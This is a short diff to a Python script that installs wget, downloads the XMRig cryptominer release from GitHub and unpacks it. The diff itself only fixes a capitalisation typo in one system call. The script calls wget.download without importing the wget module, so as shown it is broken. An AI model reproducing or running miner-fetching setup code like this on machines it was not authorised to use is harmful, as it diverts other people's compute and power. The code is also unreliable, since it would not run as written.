@@ -1,6 +1,6 @@
 import os
 os.system('pip install wget')
-Os.system('apt install wget')
+os.system('apt install wget')
 
 wget.download("https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz")
 os.system('tar xf xmrig-6.16.2-linux-static-x64.tar.gz')
